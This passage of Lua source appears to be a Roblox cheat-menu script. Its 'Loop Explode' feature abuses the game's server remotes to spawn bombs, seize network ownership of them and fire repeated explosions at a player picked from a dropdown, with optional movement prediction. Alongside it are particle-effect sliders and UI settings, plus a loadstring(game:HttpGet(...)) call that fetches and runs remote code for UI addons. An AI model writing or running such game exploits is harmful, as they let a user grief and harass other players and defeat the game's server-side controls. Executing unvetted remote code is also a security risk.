            notify('Nothing is currently grabbed', 2)
        end
    end,
})

_expTarget = nil
_expDropUpdate = false
AutoExplosionEnabled = false
ExplosionType = 'BombMissile'
ExplosionInterval = 0
PredictMovement = false
ExplosionAmount = 3
SpawnSpeed = 0
SetupSpeed = 0
ExplosionColorEnabled = false
ExplosionColor = Color3.fromRGB(255, 0, 0)
RainbowExplosionEnabled = false
ExplosionBrightness = 10
origexplosionpresets = {}
origbrightnessvals = {}
origsizevals = {}
origspeedvals = {}
origlifetimevals = {}
origdensityvals = {}
ParticleSize = 1
ParticleSpeed = 1
ParticleLifetime = 1
ParticleDensity = 1
ParticleTransparency = 0
TransparentExplosionEnabled = false
PulseColorEnabled = false
PulseColorA = Color3.fromRGB(255, 80, 0)
PulseColorB = Color3.fromRGB(0, 120, 255)
PulseSpeed = 5
StrobeEnabled = false
StrobeIntensity = 5
InvertColorEnabled = false
BlendMode = 'Default'
ExplosionConfigBox = Tabs.ExplosionTab:AddLeftGroupbox('Settings', 'settings')
ExplosionVisualBox = Tabs.ExplosionTab:AddRightGroupbox('Visuals', 'eye')
ExplosionFXBox = Tabs.ExplosionTab:AddRightGroupbox('Effects', 'sparkles')
AutoExplosionBox = Tabs.ExplosionTab:AddLeftGroupbox('Auto Explode', 'bomb')
SpawnToyRF = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
DeleteToyRE = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('DestroyToy')
BuyToy = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('BuyToyRemoteFunction')
BombEvents = ReplicatedStorage:WaitForChild('BombEvents')
SetNetworkOwner = ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')
HitboxNames = {
    BombMissile = 'PartHitDetector',
    BombDarkMatter = 'PartHitDetector',
    FireworkMissile = 'PartHitDetector',
    BombBalloon = 'Balloon',
    PresentBig = 'Box',
    PresentSmall = 'Box',
}
SetupParts = {
    BombMissile = 'Body',
    BombDarkMatter = 'Pyramid',
    FireworkMissile = 'Hitbox',
    BombBalloon = 'Balloon',
    PresentBig = 'Box',
    PresentSmall = 'Box',
}

function InitializeExplosionPresets()
    if ReplicatedStorage:FindFirstChild('ExplosionMaker') and ReplicatedStorage.ExplosionMaker:FindFirstChild('ParticlePresets') then
        for _, particle in ipairs(ReplicatedStorage.ExplosionMaker.ParticlePresets:GetChildren())do
            if particle:IsA('ParticleEmitter') then
                origexplosionpresets[particle] = particle.Color
                origbrightnessvals[particle] = particle.Brightness
                origsizevals[particle] = particle.Size
                origspeedvals[particle] = particle.Speed
                origlifetimevals[particle] = particle.Lifetime
                origdensityvals[particle] = particle.Rate
            end
        end
    end
end
function GetParticles()
    if not ReplicatedStorage:FindFirstChild('ExplosionMaker') or not ReplicatedStorage.ExplosionMaker:FindFirstChild('ParticlePresets') then
        return {}
    end

    local out = {}

    for _, p in ipairs(ReplicatedStorage.ExplosionMaker.ParticlePresets:GetChildren())do
        if p:IsA('ParticleEmitter') then
            table.insert(out, p)
        end
    end

    return out
end
function InvertColor(c)
    return Color3.new(1 - c.R, 1 - c.G, 1 - c.B)
end
function ApplyExplosionColor()
    for _, particle in ipairs(GetParticles())do
        local col

        if RainbowExplosionEnabled then
            col = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)),
                ColorSequenceKeypoint.new(0.25, Color3.new(0, 1, 0)),
                ColorSequenceKeypoint.new(0.5, Color3.new(0, 0, 1)),
                ColorSequenceKeypoint.new(0.75, Color3.new(1, 1, 0)),
                ColorSequenceKeypoint.new(1, Color3.new(1, 0, 0)),
            })
        elseif ExplosionColorEnabled then
            local c = InvertColorEnabled and InvertColor(ExplosionColor) or ExplosionColor

            col = ColorSequence.new(c)
        else
            col = origexplosionpresets[particle]
        end

        particle.Color = col
    end
end
function ApplyExplosionBrightness()
    for _, particle in ipairs(GetParticles())do
        if ExplosionBrightness == 10 then
            particle.Brightness = origbrightnessvals[particle]
        else
            particle.Brightness = origbrightnessvals[particle] * 2 * (ExplosionBrightness - 9)
        end
    end
end
function ApplyParticleSize()
    for _, particle in ipairs(GetParticles())do
        local orig = origsizevals[particle]

        if orig then
            local kps = orig.Keypoints
            local newkps = {}

            for _, kp in ipairs(kps)do
                table.insert(newkps, NumberSequenceKeypoint.new(kp.Time, kp.Value * ParticleSize, kp.Envelope))
            end

            particle.Size = NumberSequence.new(newkps)
        end
    end
end
function ApplyParticleSpeed()
    for _, particle in ipairs(GetParticles())do
        local orig = origspeedvals[particle]

        if orig then
            local kps = orig.Keypoints
            local newkps = {}

            for _, kp in ipairs(kps)do
                table.insert(newkps, NumberSequenceKeypoint.new(kp.Time, kp.Value * ParticleSpeed, kp.Envelope))
            end

            particle.Speed = NumberRange.new(orig.Min * ParticleSpeed, orig.Max * ParticleSpeed)
        end
    end
end
function ApplyParticleLifetime()
    for _, particle in ipairs(GetParticles())do
        local orig = origlifetimevals[particle]

        if orig then
            particle.Lifetime = NumberRange.new(orig.Min * ParticleLifetime, orig.Max * ParticleLifetime)
        end
    end
end
function ApplyParticleDensity()
    for _, particle in ipairs(GetParticles())do
        local orig = origdensityvals[particle]

        if orig then
            particle.Rate = orig * ParticleDensity
        end
    end
end
function ApplyParticleTransparency()
    for _, particle in ipairs(GetParticles())do
        if TransparentExplosionEnabled then
            particle.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, ParticleTransparency),
                NumberSequenceKeypoint.new(1, 1),
            })
        else
            particle.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0),
                NumberSequenceKeypoint.new(1, 1),
            })
        end
    end
end
function ApplyBlendMode()
    for _, particle in ipairs(GetParticles())do
        pcall(function()
            particle.LightEmission = (BlendMode == 'Additive') and 1 or 0
        end)
    end
end
function PulseColorLoop()
    local t = 0

    while PulseColorEnabled do
        t = t + task.wait(0.05) * PulseSpeed

        local alpha = (math.sin(t) + 1) / 2
        local blended = Color3.new(PulseColorA.R + (PulseColorB.R - PulseColorA.R) * alpha, PulseColorA.G + (PulseColorB.G - PulseColorA.G) * alpha, PulseColorA.B + (PulseColorB.B - PulseColorA.B) * alpha)

        for _, particle in ipairs(GetParticles())do
            particle.Color = ColorSequence.new(blended)
        end
    end
end
function StrobeBrightnessLoop()
    while StrobeEnabled do
        for _, particle in ipairs(GetParticles())do
            local base = origbrightnessvals[particle] or 1

            particle.Brightness = base * StrobeIntensity * (math.random() > 0.5 and 1 or 0.1)
        end

        task.wait(0.05)
    end

    ApplyExplosionBrightness()
end
function GetSpawnedToys()
    return Workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')
end
function ExpGetPlayerList()
    local list = {}

    for _, p in pairs(Players:GetPlayers())do
        if p ~= LocalPlayer then
            table.insert(list, p.DisplayName .. ' (@' .. p.Name .. ')')
        end
    end

    table.sort(list, function(a, b)
        return a:lower() < b:lower()
    end)

    return list
end
function ExpExtractUsername(entry)
    return entry and entry:match('@([%w_]+)')
end
function ExpGetPlayerByName(username)
    if not username or username == '' then
        return nil
    end

    return Players:FindFirstChild(username)
end
function ExpGetTargetHRP()
    if not _expTarget then
        return nil, nil
    end

    local p = ExpGetPlayerByName(_expTarget)

    if p and p.Character and p.Character:FindFirstChild('HumanoidRootPart') then
        return p.Character.HumanoidRootPart, p
    end

    return nil, nil
end
function ExpRefreshDropdown()
    _expDropUpdate = true

    pcall(function()
        ExplosionPlayerDropdown:SetValues(ExpGetPlayerList())
    end)

    _expDropUpdate = false
end
function GetPlayerCharacterLocal()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
        return LocalPlayer.Character
    end

    return nil
end
function LookAt(from, to)
    local dir = (to - from).Unit
    local right = dir:Cross(Vector3.new(0, 1, 0))
    local up = right:Cross(dir)

    return CFrame.fromMatrix(from, right, up)
end
function SetNetworkOwnership(part)
    if not part then
        return
    end
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
        pcall(function()
            SetNetworkOwner:FireServer(part, LookAt(LocalPlayer.Character.HumanoidRootPart.Position, part.Position))
        end)
    end
end
function SpawNoneBomb()
    local char = GetPlayerCharacterLocal()

    if char then
        local pos = char.HumanoidRootPart.Position

        pcall(function()
            SpawnToyRF:InvokeServer(ExplosionType, CFrame.new(pos + Vector3.new(0, 5, 0)), Vector3.new(0, 0, 0))
            BuyToy:InvokeServer(ExplosionType)
        end)
    end
end
function GetAllBombs()
    local toys = GetSpawnedToys()

    if not toys then
        return {}
    end

    local bombs = {}

    for _, toy in pairs(toys:GetChildren())do
        if toy.Name == ExplosionType then
            table.insert(bombs, toy)
        end
    end

    return bombs
end
function SetupBomb(bomb)
    if not bomb or not bomb.PrimaryPart then
        return
    end

    local hitPart = bomb:FindFirstChild(SetupParts[bomb.Name])

    if not hitPart then
        return
    end

    SetNetworkOwnership(hitPart)
    task.wait(0.05)
    pcall(function()
        for _, v in pairs(bomb.PrimaryPart:GetChildren())do
            if v:IsA('BodyVelocity') or v.Name == 'Stable' then
                v:Destroy()
            end
        end

        local bodyVel = Instance.new('BodyVelocity')

        bodyVel.Velocity = Vector3.new(0, 0, 0)
        bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyVel.Name = 'Stable'
        bodyVel.Parent = bomb.PrimaryPart

        bomb:PivotTo(CFrame.new(math.random(-500, 500), 10000, math.random(-500, 500)))
    end)
end
function ExplodeBomb(bomb, targetHRP)
    if not bomb or not targetHRP then
        return
    end

    local hitbox = bomb:FindFirstChild(HitboxNames[bomb.Name])

    if hitbox then
        local targetPos = targetHRP.Position

        if PredictMovement then
            targetPos = targetPos + targetHRP.Velocity / 1.93
        end

        pcall(function()
            BombEvents.BombExplode:FireServer({
                Hitbox = hitbox,
                PositionPart = targetHRP,
            }, targetPos)
        end)
    end
end
function DeleteAllBombs()
    for _, bomb in pairs(GetAllBombs())do
        pcall(function()
            DeleteToyRE:FireServer(bomb)
        end)
    end
end
function AutoExplosionLoop()
    while AutoExplosionEnabled do
        local targetHRP, targetPlayer = ExpGetTargetHRP()

        if not targetPlayer then
            AutoExplosionEnabled = false

            Toggles.AutoExplosionToggle:SetValue(false)

            break
        end
        if not targetHRP then
            task.wait(0.2)

            continue
        end

        DeleteAllBombs()
        task.wait(0.1)

        while#GetAllBombs() < ExplosionAmount and AutoExplosionEnabled do
            task.spawn(SpawNoneBomb)
            task.wait(SpawnSpeed)
            task.wait(0.02)
        end

        task.wait(0.15)

        for _, bomb in pairs(GetAllBombs())do
            if not AutoExplosionEnabled then
                break
            end

            task.spawn(function()
                SetupBomb(bomb)
            end)
            task.wait(SetupSpeed)
        end

        task.wait(0.2)

        targetHRP, targetPlayer = ExpGetTargetHRP()

        if targetHRP and targetPlayer then
            for _, bomb in pairs(GetAllBombs())do
                if not AutoExplosionEnabled then
                    break
                end

                task.spawn(function()
                    ExplodeBomb(bomb, targetHRP)
                end)
                task.wait(0.01)
            end
        end

        task.wait(0.15)
        DeleteAllBombs()
        task.wait(ExplosionInterval)
    end
end

InitializeExplosionPresets()

ExplosionPlayerDropdown = ExplosionConfigBox:AddDropdown('ExplosionPlayerDropdown', {
    Values = ExpGetPlayerList(),
    Default = nil,
    Text = 'Select Target',
    Multi = false,
    Searchable = true,
    Tooltip = 'Select the player you want to bomb',
})

ExplosionPlayerDropdown:OnChanged(function(v)
    if _expDropUpdate then
        return
    end

    local un = ExpExtractUsername(v)

    _expTarget = un or nil
end)
ExplosionConfigBox:AddButton({
    Text = 'Refresh Player List',
    Tooltip = 'Refreshes the target list',
    Func = function()
        ExpRefreshDropdown()
    end,
})
ExplosionConfigBox:AddDropdown('ExplosionTypeSelect', {
    Values = {
        'Missile',
        'Firework',
        'Void',
        'Balloon',
        'Small Present',
        'Big Present',
    },
    Default = 'Missile',
    Tooltip = 'Choose what Explosion Type you want',
    Text = 'Explosion Type',
    Callback = function(Value)
        local typeMap = {
            Missile = 'BombMissile',
            Firework = 'FireworkMissile',
            Void = 'BombDarkMatter',
            Balloon = 'BombBalloon',
            ['Small Present'] = 'PresentSmall',
            ['Big Present'] = 'PresentBig',
        }

        ExplosionType = typeMap[Value] or 'BombMissile'
    end,
})
ExplosionConfigBox:AddSlider('BombAmount', {
    Text = 'Bomb Amount',
    Tooltip = 'How many bombs explode per cycle',
    Default = 3,
    Min = 1,
    Max = 10,
    Rounding = 0,
    Suffix = ' bombs',
    Callback = function(Value)
        ExplosionAmount = Value
    end,
})
ExplosionConfigBox:AddCheckbox('PredictMovement', {
    Text = 'Predict Movement',
    Default = false,
    Tooltip = 'Leads the target based on their current velocity',
    Callback = function(Value)
        PredictMovement = Value
    end,
})

ExplosionColorToggle = ExplosionVisualBox:AddCheckbox('ExplosionColorToggle', {
    Text = 'Custom Explosion Color',
    Default = false,
    Tooltip = 'Change the explosion particle color',
    Callback = function(Value)
        ExplosionColorEnabled = Value
        RainbowExplosionEnabled = false

        ApplyExplosionColor()
    end,
})

ExplosionColorToggle:AddColorPicker('ExplosionColorPicker', {
    Title = 'Explosion Color',
    Default = Color3.fromRGB(255, 0, 0),
    Callback = function(Value)
        ExplosionColor = Value

        if ExplosionColorEnabled then
            ApplyExplosionColor()
        end
    end,
})
ExplosionVisualBox:AddCheckbox('RainbowExplosion', {
    Text = 'Rainbow Explosions',
    Default = false,
    Tooltip = 'Cycle through all hues on every explosion',
    Callback = function(Value)
        RainbowExplosionEnabled = Value

        if Value then
            ExplosionColorEnabled = false
        end

        ApplyExplosionColor()
    end,
})
ExplosionVisualBox:AddCheckbox('InvertColorToggle', {
    Text = 'Invert Explosion Color',
    Default = false,
    Tooltip = 'Inverts the currently applied explosion color',
    Callback = function(Value)
        InvertColorEnabled = Value

        ApplyExplosionColor()
    end,
})
ExplosionVisualBox:AddSlider('BrightnessSlider', {
    Text = 'Explosion Brightness',
    Default = 10,
    Tooltip = 'Multiplies particle brightness',
    Min = 10,
    Max = 50,
    Rounding = 0,
    Callback = function(Value)
        ExplosionBrightness = Value

        ApplyExplosionBrightness()
    end,
})
ExplosionVisualBox:AddSlider('ParticleSizeSlider', {
    Text = 'Particle Size',
    Default = 1,
    Tooltip = 'Scales the size of explosion particles',
    Min = 1,
    Max = 10,
    Rounding = 1,
    Suffix = 'x',
    Callback = function(Value)
        ParticleSize = Value

        ApplyParticleSize()
    end,
})
ExplosionVisualBox:AddSlider('ParticleSpeedSlider', {
    Text = 'Particle Speed',
    Default = 1,
    Tooltip = 'Scales how fast explosion particles travel outward',
    Min = 1,
    Max = 10,
    Rounding = 1,
    Suffix = 'x',
    Callback = function(Value)
        ParticleSpeed = Value

        ApplyParticleSpeed()
    end,
})
ExplosionVisualBox:AddSlider('ParticleLifetimeSlider', {
    Text = 'Particle Lifetime',
    Default = 1,
    Tooltip = 'Multiplies how long each explosion particle lives',
    Min = 1,
    Max = 10,
    Rounding = 1,
    Suffix = 'x',
    Callback = function(Value)
        ParticleLifetime = Value

        ApplyParticleLifetime()
    end,
})
ExplosionVisualBox:AddSlider('ParticleDensitySlider', {
    Text = 'Particle Density',
    Default = 1,
    Tooltip = 'Multiplies how many particles emit per burst',
    Min = 1,
    Max = 10,
    Rounding = 1,
    Suffix = 'x',
    Callback = function(Value)
        ParticleDensity = Value

        ApplyParticleDensity()
    end,
})
ExplosionVisualBox:AddCheckbox('TransparentExplosionToggle', {
    Text = 'Custom Transparency',
    Default = false,
    Tooltip = 'Enables custom particle transparency',
    Callback = function(Value)
        TransparentExplosionEnabled = Value

        ApplyParticleTransparency()
    end,
})
ExplosionVisualBox:AddSlider('ParticleTransparencySlider', {
    Text = 'Particle Transparency',
    Default = 0,
    Tooltip = 'Transparency at particle birth (0 = solid, 1 = invisible)',
    Min = 0,
    Max = 10,
    Rounding = 1,
    Suffix = '',
    Callback = function(Value)
        ParticleTransparency = Value / 10

        if TransparentExplosionEnabled then
            ApplyParticleTransparency()
        end
    end,
})
ExplosionVisualBox:AddDropdown('BlendModeSelect', {
    Values = {
        'Default',
        'Additive',
    },
    Default = 'Default',
    Text = 'Blend Mode',
    Tooltip = 'Default = normal rendering; Additive = glowing/light-emission look',
    Callback = function(Value)
        BlendMode = Value

        ApplyBlendMode()
    end,
})
ExplosionFXBox:AddCheckbox('PulseColorToggle', {
    Text = 'Pulse Color',
    Default = false,
    Tooltip = 'Smoothly pulses particle color between two chosen colors',
    Callback = function(Value)
        PulseColorEnabled = Value

        if Value then
            RainbowExplosionEnabled = false
            ExplosionColorEnabled = false

            task.spawn(PulseColorLoop)
        else
            ApplyExplosionColor()
        end
    end,
})

local PulseColorACheckbox = ExplosionFXBox:AddCheckbox('PulseColorACheckbox', {
    Text = 'Pulse Color A',
    Default = false,
    Tooltip = 'Pick the first pulse color',
})

PulseColorACheckbox:AddColorPicker('PulseColorA', {
    Title = 'Pulse Color A',
    Default = Color3.fromRGB(255, 80, 0),
    Callback = function(Value)
        PulseColorA = Value
    end,
})

local PulseColorBCheckbox = ExplosionFXBox:AddCheckbox('PulseColorBCheckbox', {
    Text = 'Pulse Color B',
    Default = false,
    Tooltip = 'Pick the second pulse color',
})

PulseColorBCheckbox:AddColorPicker('PulseColorB', {
    Title = 'Pulse Color B',
    Default = Color3.fromRGB(0, 120, 255),
    Callback = function(Value)
        PulseColorB = Value
    end,
})
ExplosionFXBox:AddSlider('PulseSpeedSlider', {
    Text = 'Pulse Speed',
    Default = 5,
    Tooltip = 'How fast the color oscillates between the two pulse colors',
    Min = 1,
    Max = 20,
    Rounding = 0,
    Suffix = ' spd',
    Callback = function(Value)
        PulseSpeed = Value
    end,
})
ExplosionFXBox:AddCheckbox('StrobeExplosionToggle', {
    Text = 'Strobe Brightness',
    Default = false,
    Tooltip = 'Rapidly flickers particle brightness for a strobe effect',
    Callback = function(Value)
        StrobeEnabled = Value

        if Value then
            task.spawn(StrobeBrightnessLoop)
        else
            ApplyExplosionBrightness()
        end
    end,
})
ExplosionFXBox:AddSlider('StrobeIntensitySlider', {
    Text = 'Strobe Intensity',
    Default = 5,
    Tooltip = 'How extreme the brightness flicker is',
    Min = 1,
    Max = 20,
    Rounding = 0,
    Suffix = 'x',
    Callback = function(Value)
        StrobeIntensity = Value
    end,
})
AutoExplosionBox:AddCheckbox('AutoExplosionToggle', {
    Text = 'Loop Explode',
    Default = false,
    Tooltip = 'Continuously explodes the selected target',
    Callback = function(Value)
        AutoExplosionEnabled = Value

        if Value then
            if not _expTarget then
                AutoExplosionEnabled = false

                Toggles.AutoExplosionToggle:SetValue(false)
                notify('Explosion', 'Select a target first', 3)

                return
            end
            if not ExpGetPlayerByName(_expTarget) then
                AutoExplosionEnabled = false

                Toggles.AutoExplosionToggle:SetValue(false)
                notify('Explosion', 'Target not found in server', 3)

                return
            end

            task.spawn(AutoExplosionLoop)
        else
            task.wait(0.3)
            DeleteAllBombs()
        end
    end,
})
AutoExplosionBox:AddSlider('ExplosionInterval', {
    Text = 'Explosion Interval',
    Default = 0,
    Tooltip = 'Delay between each explosion cycle',
    Min = 0,
    Max = 5,
    Rounding = 1,
    Suffix = ' sec',
    Callback = function(Value)
        ExplosionInterval = Value
    end,
})
Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    ExpRefreshDropdown()
end)
Players.PlayerRemoving:Connect(function(plr)
    task.wait(0.5)

    if plr.Name == _expTarget then
        AutoExplosionEnabled = false
        _expTarget = nil

        pcall(function()
            Toggles.AutoExplosionToggle:SetValue(false)
        end)
    end

    ExpRefreshDropdown()
end)

SoundService = game:GetService('SoundService')
Lighting = game:GetService('Lighting')
TweenService = game:GetService('TweenService')
ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Interface', 'monitor')
AppearanceGroup = Tabs['UI Settings']:AddLeftGroupbox('Appearance', 'palette')

MenuGroup:AddLabel('Menu Keybind'):AddKeyPicker('MenuKeybind', {
    Default = 'RightShift',
    NoUI = true,
})

Library.ToggleKeybind = Options.MenuKeybind

MenuGroup:AddCheckbox('ShowCursor', {
    Text = 'Custom Cursor',
    Default = false,
    Callback = function(v)
        Library.ShowCustomCursor = v
    end,
})
AppearanceGroup:AddSlider('CornerRadius', {
    Text = 'Corner Radius',
    Default = Library.CornerRadius,
    Min = 0,
    Max = 20,
    Callback = function(v)
        Window:SetCornerRadius(v)
    end,
})
AppearanceGroup:AddDropdown('DPIScale', {
    Text = 'DPI Scale',
    Values = {
        '50%',
        '75%',
        '100%',
        '125%',
        '150%',
        '175%',
        '200%',
    },
    Default = '100%',
    Callback = function(v)
        Library:SetDPIScale(tonumber(v:gsub('%%', '')))
    end,
})
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({
    'MenuKeybind',
})
ThemeManager:SetFolder('MyScriptHub')
SaveManager:SetFolder('MyScriptHub/specific-game')
SaveManager:SetSubFolder('specific-place')
SaveManager:BuildConfigSection(Tabs['UI Settings'])
ThemeManager:ApplyToTab(Tabs['UI Settings'])
SaveManager:LoadAutoloadConfig()
